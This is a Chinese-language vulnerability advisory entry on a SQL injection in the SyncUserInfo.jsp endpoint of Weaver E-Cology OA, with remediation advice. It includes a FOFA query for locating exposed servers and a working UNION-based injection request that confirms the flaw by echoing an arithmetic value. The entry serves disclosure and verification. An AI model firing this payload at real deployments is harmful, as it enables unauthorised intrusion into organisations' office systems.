---
cve: ""
fofa: "app=\"泛微-协同办公OA\""
version: "未知"
source: "https://github.com/projectdiscovery/nuclei-templates/blob/8b9d065ccb0492d39f7680c908b3030a97ddfe1b/http/vulnerabilities/weaver/ecology/ecology-syncuserinfo-sqli.yaml"
---

# 泛微OA SyncUserInfo.jsp SQL注入漏洞

## 漏洞描述

泛微 E-Cology 的 `/mobile/plugin/SyncUserInfo.jsp` 存在公开记录的 `userIdentifiers` 参数 SQL 注入。公开请求通过 UNION 查询回显纯算术结果，用于验证输入影响 SQL 执行。

## 影响范围与前提

产品：泛微 E-Cology；具体版本、数据库兼容范围和修复版本未知。公开模板未携带登录凭证，认证要求仍需按具体部署确认。

## 公开验证资料

```http
GET /mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str(98989*44313),null HTTP/1.1
Host: oa.example.com
```

正确计算为 `98989 × 44313 = 4386499557`。应在实际结果中观察到该值，并用正常输入对照排除静态页面和请求反射。原稿的 `4370323157` 是计算错误。公开模板允许跟随重定向，最终落入登录页的 HTTP 200 不能视为 SQL 注入成功。

## 修复建议

向厂商核对当前版本和对应安全更新；在修复前限制该接口的访问，并检查相关访问日志。

## 参考来源

- [公开资料 1](https://github.com/projectdiscovery/nuclei-templates/blob/8b9d065ccb0492d39f7680c908b3030a97ddfe1b/http/vulnerabilities/weaver/ecology/ecology-syncuserinfo-sqli.yaml)
- [公开资料 2](https://github.com/LittleBear4/OA-EXPTOOL/blob/e2beff80059570bf58292d052d97a497749d87ea/book/weaver/ecology-syncuserinfo-sqli.yaml)

来源已于 2026-10-02 静态核对；本文未在目标环境执行请求，公开 PoC 不代表本地复现通过。
